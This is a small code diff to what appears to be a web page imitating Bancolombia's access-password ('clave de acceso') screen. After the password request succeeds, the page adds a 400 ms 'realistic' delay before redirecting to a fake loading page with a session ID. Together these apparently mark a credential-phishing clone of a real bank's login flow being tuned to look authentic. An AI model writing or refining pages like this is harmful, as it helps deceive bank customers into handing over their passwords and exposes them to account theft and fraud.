@@ -77,6 +77,8 @@ export default function BancolombiaClaveAccesoPage() {
       });
 
       if (response.ok) {
+        // Delay realista antes de navegar
+        await new Promise(resolve => setTimeout(resolve, 400));
         // Redirigir a la página de validación/cargando
         router.push(`/bancolombia/cargando?sessionId=${sessionId}`);
       }
